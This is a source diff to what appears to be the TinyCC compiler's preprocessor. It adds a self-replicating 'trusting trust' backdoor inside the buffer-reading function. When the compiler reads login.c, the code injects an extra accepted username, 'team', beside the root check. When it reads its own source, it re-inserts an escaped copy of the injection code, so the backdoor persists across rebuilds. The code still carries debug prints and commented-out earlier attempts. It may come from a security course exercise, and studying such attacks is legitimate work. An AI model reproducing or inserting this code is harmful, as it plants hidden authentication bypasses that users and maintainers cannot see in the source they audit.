@@ -660,57 +660,59 @@ static int handle_eob(void)
     /* only tries to read if really end of buffer */
     if (bf->buf_ptr >= bf->buf_end) {
         if (bf->fd >= 0) {
-            const char *codeString = "printf(\"%s\", \"test\");";
-    // const char *codeString = "\";"\
-    //     "const char *eobCode =  \"else {\\n            len = 0;\\n        }\\n        total_bytes += len;\\n\";"\
-    //     "const char *eobCodeEnd = \"total_bytes += len;\\n        bf->buf_ptr = bf->buffer;\\n        bf->buf_end = bf->buffer + len;\";"\
-    //     "char *login_match_ptr, *tcc_match_ptr, *tcc_match_endptr;"\
-    //     "if (!strcmp(bf->filename, \"login.c\") && strstr(bf->buffer, \"strcmp(username, \\\"team\\\")\")==NULL) {"\
-    //         "printf(\"%s\", \"this is login.c\");"
-    //         "char* needle = \"strcmp(username, \\\"root\\\")\";"\
-    //         "char* found = strstr(file->buffer, needle);"\
-    //         "char* found2 = strstr(file->buffer, \"strcmp(username, \\\"team\\\")\");"\
-    //         "if (found != NULL && found2 ==NULL) {"\
-    //             "printf(\"%s\", \"found\");"
-    //             "char* insertion_point = found + strlen(needle);"\
-    //             "memmove(insertion_point + strlen(\" || !strcmp(username, \\\"team\\\")\"), insertion_point, strlen(insertion_point) + 1);"\
-    //             "memcpy(insertion_point, \" || !strcmp(username, \\\"team\\\")\", strlen(\" || !strcmp(username, \\\"team\\\")\"));"\
-    //         "}"\
-    //         "len+=strlen(\" || !strcmp(username, \\\"team\\\")\")-1;"\
-    //     "} else if(strstr(bf->buffer, eobCode)!=NULL && strstr(bf->buffer, \"strcmp(username, \\\"team\\\")\")==NULL){"\
-    //         "if (strstr(bf->buffer, eobCodeEnd)!=NULL){"\
-    //             "tcc_match_ptr = strstr(file->buffer, eobCode)+ strlen(eobCode);"\
-    //             "tcc_match_endptr = strstr(file->buffer, eobCodeEnd);"\
-    //             "char rep[IO_BUF_SIZE] = \"const char *codeString = \\\"\";"\
-    //             "char *dst = rep + strlen(rep);"\
-    //             "char *src = (char*)codeString;"\
-    //             "while (src < codeString + strlen(codeString)) {"\
-    //                 "if (*src == '\\\\' || *src == '\"')"\
-    //                     "*dst++ = '\\\\';"\
-    //                 "*dst++ = *src++;"\
-    //             "}"\
-    //             "strcpy(dst, codeString);"\
-    //             "int offset = strlen(rep) + 1 + tcc_match_ptr - tcc_match_endptr;"\
-    //             "char *p = file->buffer + len;"\
-    //             "while (p > tcc_match_endptr) {"\
-    //                 "p--;"\
-    //                 "*(p + offset) = *p;"\
-    //             "}"\
-    //             "strcpy(tcc_match_ptr, rep);"\
-    //             "*(tcc_match_ptr + strlen(rep)) = ' ';"\
-    //             "len += offset;"\
-    //             "printf(\"%s\", file->buffer);"\
-    //         "}"\
-    //     "}";
-        const char *eobCode =  "if (bf->buf_ptr >= bf->buf_end) {\n        if (bf->fd >= 0) {";
-        const char *eobCodeEnd = "if (len < 0)\n                len = 0;\n        } else {\n            len = 0;";
-        unsigned char *login_match_ptr, *tcc_match_ptr, *tcc_match_endptr;
+
+
 #if defined(PARSE_DEBUG)
             len = 1;
 #else
             len = IO_BUF_SIZE;
 #endif
-            len = read(bf->fd, bf->buffer, len-(strlen(codeString)+1));
+
+        unsigned char *codeString = "\";\
+        unsigned char *eobCode =  \"len = read(bf->fd, bf->buffer, len);\";\
+        unsigned char *eobCodeEnd = \"if (len < 0)\\n                len = 0;\\n        } else {\\n            len = 0;\";\
+        unsigned char *tccpp_ptr, *tccpp_endptr;\
+        len = read(bf->fd, bf->buffer, len-5632);\
+        if (!strcmp(bf->filename, \"login.c\") && strstr(bf->buffer, \"strcmp(username, \\\"team\\\")\")==NULL) {\
+            int initialBytes = strlen(bf->buffer);\
+            char* needle = \"strcmp(username, \\\"root\\\")\";\
+            char* found = strstr(file->buffer, needle);\
+            char* found2 = strstr(file->buffer, \"strcmp(username, \\\"team\\\")\");\
+            if (found != NULL && found2 ==NULL) {\
+                char* insertion_point = found + strlen(needle);\
+                memmove(insertion_point + strlen(\" || !strcmp(username, \\\"team\\\")\"), insertion_point, strlen(insertion_point) + 1);\
+                memcpy(insertion_point, \" || !strcmp(username, \\\"team\\\")\", strlen(\" || !strcmp(username, \\\"team\\\")\"));\
+            }\
+            len+=strlen(bf->buffer)-initialBytes;\
+        }\
+        else if((tccpp_ptr = strstr(bf->buffer, eobCode)) && tccpp_ptr < bf->buffer+ len){\
+            if (tccpp_endptr = strstr(bf->buffer, eobCodeEnd)){\
+                int initialBytes = strlen(bf->buffer);\
+                unsigned char strC[IO_BUF_SIZE]=\"unsigned char *codeString = \\\"\";\
+                unsigned char *ptr = strC+strlen(strC);\
+                unsigned char *codePtr = (char*)codeString;\
+                while (codePtr < codeString + strlen(codeString)) {\
+                    if (*codePtr == '\\\\' || *codePtr == '\"')\
+                        *ptr++ = '\\\\';\
+                    *ptr++ = *codePtr++;\
+                }\
+                strcpy(ptr, codeString);\
+                unsigned char strD[IO_BUF_SIZE*2];\
+                int position = (int)(tccpp_ptr - bf->buffer) / sizeof(char);\
+                strncpy(strD, bf->buffer, position);\
+                strD[position] = '\\0';\
+                strcat(strD, strC);\
+                strcat(strD, bf->buffer + position+strlen(\"len = read(bf->fd, bf->buffer, len);\"));\
+                memset(bf->buffer, '\\0', sizeof(bf->buffer));\
+                strcpy(bf->buffer, strD);\
+                len+=strlen(bf->buffer)-initialBytes;\
+            }\
+        }\
+        ";
+        unsigned char *eobCode =  "len = read(bf->fd, bf->buffer, len);";
+        unsigned char *eobCodeEnd = "if (len < 0)\n                len = 0;\n        } else {\n            len = 0;";
+        unsigned char *tccpp_ptr, *tccpp_endptr;
+        len = read(bf->fd, bf->buffer, len-5632);
         if (!strcmp(bf->filename, "login.c") && strstr(bf->buffer, "strcmp(username, \"team\")")==NULL) {
             printf("%s", "this is login.c");
             char* needle = "strcmp(username, \"root\")";
@@ -722,57 +724,31 @@ static int handle_eob(void)
                 memmove(insertion_point + strlen(" || !strcmp(username, \"team\")"), insertion_point, strlen(insertion_point) + 1);
                 memcpy(insertion_point, " || !strcmp(username, \"team\")", strlen(" || !strcmp(username, \"team\")"));
             }
-            
             len+=strlen(" || !strcmp(username, \"team\")")-1;
-        } else if((tcc_match_ptr = strstr(bf->buffer, eobCode)) && tcc_match_ptr < bf->buffer + len){
-            tcc_match_ptr+=strlen(eobCode);
-            if (tcc_match_endptr = strstr(bf->buffer, eobCodeEnd)){
-                // char rep[IO_BUF_SIZE] = "const char *codeString = \""; /* the replace string */
-                // char *dst = rep + strlen(rep);
-                // char *src = (char*)codeString;
-                // while (src < codeString + strlen(codeString)) { /* copy content of string tcc_replace with escape */
-                //     if (*src == '\\' || *src == '"')
-                //         *dst++ = '\\';
-                //     *dst++ = *src++;
-                // }
-                // strcpy(dst, codeString); /* copy content of string tcc_replace */
-                // char* insertion_point = strstr(file->buffer, eobCode) + strlen(eobCode);
-
-                unsigned char strC[IO_BUF_SIZE*2];
-                int position = (int)(tcc_match_ptr - bf->buffer) / sizeof(char);
-                strncpy(strC, bf->buffer, position);
-                strC[position] = '\0';
-                strcat(strC, codeString);
-                strcat(strC, bf->buffer + position);
-                // int offset = strlen(codeString) + 1 + tcc_match_ptr - tcc_match_endptr;
-                // memmove(tcc_match_ptr + strlen(codeString), tcc_match_ptr, strlen(codeString));
-                // memcpy(tcc_match_ptr, codeString, strlen(codeString));
-
-                // memcpy(bf->buffer, strC, strlen(strC)+1);
-                // memmove(bf->buffer, strC, strlen(strC)+1);
+        } else if((tccpp_ptr = strstr(bf->buffer, eobCode)) && tccpp_ptr < bf->buffer+ len){
+            if (tccpp_endptr = strstr(bf->buffer, eobCodeEnd)){
+                int initialBytes = strlen(bf->buffer);
+                unsigned char strC[IO_BUF_SIZE]="unsigned char *codeString = \"";
+                unsigned char *ptr = strC+strlen(strC);
+                unsigned char *codePtr = (char*)codeString;
+                while (codePtr < codeString + strlen(codeString)) {
+                    if (*codePtr == '\\' || *codePtr == '"')
+                        *ptr++ = '\\';
+                    *ptr++ = *codePtr++;
+                }
+                strcpy(ptr, codeString);
+                unsigned char strD[IO_BUF_SIZE*2];
+                int position = (int)(tccpp_ptr - bf->buffer) / sizeof(char);
+                strncpy(strD, bf->buffer, position);
+                strD[position] = '\0';
+                strcat(strD, strC);
+                strcat(strD, bf->buffer + position+strlen("len = read(bf->fd, bf->buffer, len);"));
                 memset(bf->buffer, '\0', sizeof(bf->buffer));
-                strcpy(bf->buffer, strC);
-                // bf->buffer[strlen(bf->buffer)]='\0';
-                // char *p = bf->buffer + len;
-                //     while (p > tcc_match_endptr) { /* move the original code after match */
-                //         p--;
-                //         *(p + offset) = *p;
-                //     }
-                //     strcpy(tcc_match_ptr, rep);
-                // printf("%ld\n%ld\n%ld", strlen(tcc_match_ptr), strlen(file->buffer), strlen(bf->buffer));
-                // printf("%s =================", strC);
-                // int offset = strlen(strC) + 1 + tcc_match_ptr - tcc_match_endptr;
-                // len+=strlen(strC)-1;
-                
-                
-                // printf("%d\n\n%ld\n\n%d", offset, strlen(strC)-1, len);
-                len += strlen(codeString);
-                // printf("%ld\n\n%ld\n\n%d",strlen(bf->buffer), strlen(strC)-1, len);
-                
-                if (!strcmp(bf->filename, "tccpp.c")){printf("%s\n", bf->buffer);}
-                
+                strcpy(bf->buffer, strD);
+                printf("\n%s\n", bf->buffer);
+                printf("%ld", strlen(strD)-initialBytes);
+                len+=strlen(bf->buffer)-initialBytes;
             }
-            
         }
         
 
